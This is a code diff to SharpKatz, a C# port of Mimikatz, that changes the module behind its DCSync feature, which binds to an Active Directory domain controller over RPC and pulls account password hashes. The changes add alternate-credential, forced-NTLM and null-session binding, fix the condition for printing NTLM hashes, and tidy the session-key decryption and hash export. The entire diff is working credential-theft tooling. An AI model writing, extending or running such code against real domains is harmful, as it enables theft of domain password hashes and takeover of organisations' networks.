@@ -45,6 +45,11 @@ namespace SharpKatz.Module
         const int RPC_C_AUTHN_LEVEL_PKT_PRIVACY = 6;
         const int RPC_C_OPT_SECURITY_CALLBACK = 10;
 
+        public const int RPC_C_AUTHN_WINNT = 10;
+        public const int RPC_C_AUTHN_GSS_NEGOTIATE = 9;
+        public const int RPC_C_AUTHN_GSS_KERBEROS = 16;
+        public const int RPC_C_AUTHN_NONE = 0;
+
         const int SECPKG_ATTR_SESSION_KEY = 9;
 
         const string szOID_ANSI_name = "1.2.840.113556.1.4.1";
@@ -197,7 +202,7 @@ namespace SharpKatz.Module
         static FreeMemoryFunctionDelegate freeMemoryFunctionDelegate;
         private delegate void FreeMemoryFunctionDelegate(IntPtr memory);
 
-        public static bool FinCredential(string domain, string dc, string user = null, string guid = null, string sid = null, string altservice = "ldap", bool alldata = false)
+        public static bool FinCredential(string domain, string dc, string user = null, string guid = null, string sid = null, string altservice = "ldap", bool alldata = false, string authuser = null, string authdomain = null, string authpassword = null, bool forcentlm = false)
         {
             IntPtr hBinding;
             Guid UserGuid;
@@ -218,7 +223,11 @@ namespace SharpKatz.Module
 
             Asn1_init();
 
-            hBinding = CreateBinding(dc, altservice);
+            int rpcAuth = RPC_C_AUTHN_GSS_NEGOTIATE;
+            if (forcentlm)
+                rpcAuth = RPC_C_AUTHN_WINNT;
+
+            hBinding = CreateBinding(dc, altservice, rpcAuth, authuser,authdomain,authpassword,forcentlm);
 
             if (hBinding != IntPtr.Zero)
             {
@@ -289,6 +298,10 @@ namespace SharpKatz.Module
                         Console.WriteLine("[x] Error DC bind: {0}", result);
                     }
                 }
+            }
+            else
+            {
+                Console.WriteLine("[x] Error CreateBind");
             }
 
             Asn1_term();
@@ -373,9 +386,6 @@ namespace SharpKatz.Module
 
                 encodedOID = (OssEncodedOID)Marshal.PtrToStructure(ot, typeof(OssEncodedOID));
 
-                //Console.WriteLine("dotOID " + dotOID);
-                //Console.WriteLine("Marshal.PtrToStringAnsi(encodedOID.value) " + Marshal.PtrToStringAnsi(encodedOID.value));
-                //Console.WriteLine("Marshal.ReadUInt32(encodedOID.value,8) " + (UInt64)Marshal.ReadInt64(encodedOID.value));
             }
             return status;
         }
@@ -384,19 +394,6 @@ namespace SharpKatz.Module
         {
             bool status = false;
             IntPtr entries;
-
-            /*for (int i = 0; i < prefixTable.PrefixCount; i++)
-            {
-                if (prefixTable.pPrefixEntry[i].prefix.length == oidPrefix.length)
-                {
-                    if (EqualMemory(prefixTable.pPrefixEntry[i].prefix.elements, oidPrefix.value, oidPrefix.length))
-                    {
-                        status = true;
-                        ndx = prefixTable.pPrefixEntry[i].ndx;
-                        break;
-                    }
-                }
-            }*/
 
             if (!status)
             {
@@ -521,7 +518,7 @@ namespace SharpKatz.Module
             }
         }
 
-        private static IntPtr CreateBinding(string dc, string altservice)
+        public static IntPtr CreateBinding(string dc, string altservice, int rpcAuth, string authuser = null, string authdomain = null, string authpassword =null, bool forcentlm = false, bool nullsession = false)
         {
             IntPtr pStringBinding;
             IntPtr hBinding = IntPtr.Zero;
@@ -533,15 +530,64 @@ namespace SharpKatz.Module
                 string stringBinding = Marshal.PtrToStringUni(pStringBinding);
                 rpcStatus = (NTSTATUS)RpcBindingFromStringBinding(stringBinding, out hBinding);
 
-
-                if (rpcStatus == NTSTATUS.Success)
+                if (rpcStatus == NTSTATUS.Success && rpcAuth != RPC_C_AUTHN_NONE)
                 {
                     RPC_SECURITY_QOS securityqos = new RPC_SECURITY_QOS();
                     securityqos.Version = 1;
                     securityqos.Capabilities = 1;
                     GCHandle qoshandle = GCHandle.Alloc(securityqos, GCHandleType.Pinned);
 
-                    rpcStatus = (NTSTATUS)RpcBindingSetAuthInfoEx(hBinding, altservice + "/" + dc, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, 9, IntPtr.Zero, 0, ref securityqos);
+                    IntPtr psecAuth = IntPtr.Zero;
+                    if(!string.IsNullOrEmpty(authuser))
+                    {
+
+                        SEC_WINNT_AUTH_IDENTITY_W secAuth = new SEC_WINNT_AUTH_IDENTITY_W
+                        {
+                            User = authuser,
+                            Domain = authdomain,
+                            Password = authpassword,
+                            UserLength = authuser.Length,
+                            DomainLength = authdomain.Length,
+                            PasswordLength = authpassword.Length,
+                            Flags = 2
+                        };
+
+                        psecAuth = Marshal.AllocHGlobal(Marshal.SizeOf(secAuth));
+                        Marshal.StructureToPtr(secAuth, psecAuth, false);
+
+                        if (secAuth.UserLength > 0)
+                        {
+                            Console.WriteLine("[!] [AUTH] Username: {0}", authuser);
+                            Console.WriteLine("[!] [AUTH] Domain  : {0}", authdomain);
+                            Console.WriteLine("[!] [AUTH] Password: {0}", authpassword);
+                        }
+                        
+                    }
+                    else if(nullsession)
+                    {
+
+                        SEC_WINNT_AUTH_IDENTITY_W secAuth = new SEC_WINNT_AUTH_IDENTITY_W
+                        {
+                            User = authuser,
+                            Domain = authdomain,
+                            Password = authpassword,
+                            UserLength = 0,
+                            DomainLength = 0,
+                            PasswordLength = 0,
+                            Flags = 2
+                        };
+
+                        psecAuth = Marshal.AllocHGlobal(Marshal.SizeOf(secAuth));
+                        Marshal.StructureToPtr(secAuth, psecAuth, false);
+
+                    }
+
+                    if (forcentlm)
+                    {
+                        Console.WriteLine("[!] [AUTH] Explicit NTLM Mode");
+                    }
+
+                    rpcStatus = (NTSTATUS)RpcBindingSetAuthInfoEx(hBinding, altservice + "/" + dc, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, (uint)rpcAuth, psecAuth, 0, ref securityqos);
                     qoshandle.Free();
                     if (rpcStatus == 0)
                     {
@@ -550,12 +596,14 @@ namespace SharpKatz.Module
                         rpcStatus = (NTSTATUS)RpcBindingSetOption(hBinding, RPC_C_OPT_SECURITY_CALLBACK, Marshal.GetFunctionPointerForDelegate(rpcSecurityCallbackDelegate));
                         if (rpcStatus != 0)
                         {
+                            Console.WriteLine("[x] Error RpcBindingSetOption :  {0}", rpcStatus);
                             Unbind(hBinding);
                             hBinding = IntPtr.Zero;
                         }
                     }
                     else
                     {
+                        Console.WriteLine("[x] Error RpcBindingSetAuthInfoEx :  {0}", rpcStatus);
                         Unbind(hBinding);
                         hBinding = IntPtr.Zero;
                     }
@@ -563,9 +611,14 @@ namespace SharpKatz.Module
                 }
                 else
                 {
-                    hBinding = IntPtr.Zero;
+                    if (rpcStatus != NTSTATUS.Success)
+                        hBinding = IntPtr.Zero;
                 }
 
+            }
+            else
+            {
+                Console.WriteLine("[x] Error RpcStringBindingCompose :  {0}", rpcStatus);
             }
 
             return hBinding;
@@ -995,10 +1048,16 @@ namespace SharpKatz.Module
         {
             if (data.Length < 16)
                 return null;
-            MD5CryptoServiceProvider md5 = new MD5CryptoServiceProvider();
-            md5.TransformBlock(SessionKey, 0, SessionKey.Length, SessionKey, 0);
-            md5.TransformFinalBlock(data, 0, 16);
-            byte[] key = md5.Hash;
+
+            byte[] key;
+
+            using (MD5CryptoServiceProvider md5 = new MD5CryptoServiceProvider())
+            {
+                md5.TransformBlock(SessionKey, 0, SessionKey.Length, SessionKey, 0);
+                md5.TransformFinalBlock(data, 0, 16);
+                key = md5.Hash;
+            }
+
             byte[] todecrypt = new byte[data.Length - 16];
             Array.Copy(data, 16, todecrypt, 0, data.Length - 16);
             CRYPTO_BUFFER todecryptBuffer = GetCryptoBuffer(todecrypt);
@@ -1148,6 +1207,7 @@ namespace SharpKatz.Module
             dic.TryGetValue("ATT_SERVICE_PRINCIPAL_NAME", out object spn);
             dic.TryGetValue("ATT_USER_PRINCIPAL_NAME", out object upn);
 
+            Console.WriteLine("[*]");
             Console.WriteLine("[*] Object RDN           : {0}", rdn);
             Console.WriteLine("[*]");
             Console.WriteLine("[*] ** SAM ACCOUNT **");
@@ -1178,10 +1238,10 @@ namespace SharpKatz.Module
             }
             Console.WriteLine("[*]");
 
-            if (ntPwdHistory != null || ntPwdHistory != null || lmPwd != null || lmPwdHistory != null)
+            if (unicodePwd != null || ntPwdHistory != null || lmPwd != null || lmPwdHistory != null)
             {
                 Console.WriteLine("[*] Credentials:");
-                if (ntPwdHistory != null)
+                if (unicodePwd != null)
                 {
                     Console.WriteLine("[*] Hash NTLM            : {0}", Utility.PrintHashBytes((byte[])unicodePwd));
                 }
@@ -1333,12 +1393,13 @@ namespace SharpKatz.Module
 
             if (objectSid != null || samAccountName != null || unicodePwd != null || uac != null)
             {
-                string outstring = string.Format("{0}\t", objectSid);
-                outstring += string.Format("{0}\t", samAccountName);
-                outstring += string.Format("{0}\t", Utility.PrintHashBytes((byte[])unicodePwd));
-                outstring += string.Format("{0}", UacToString(Convert.ToInt32(uac)));
+                StringBuilder sb = new StringBuilder();
+                sb.AppendFormat(NumberFormatInfo.InvariantInfo, "{0}\t", objectSid);
+                sb.AppendFormat(NumberFormatInfo.InvariantInfo, "{0}\t", samAccountName);
+                sb.AppendFormat(NumberFormatInfo.InvariantInfo, "{0}\t", Utility.PrintHashBytes((byte[])unicodePwd));
+                sb.AppendFormat(NumberFormatInfo.InvariantInfo, "{0}", UacToString(Convert.ToInt32(uac)));
 
-                sw.WriteLine(outstring);
+                sw.WriteLine(sb.ToString());
             }
 
             sw.Close();
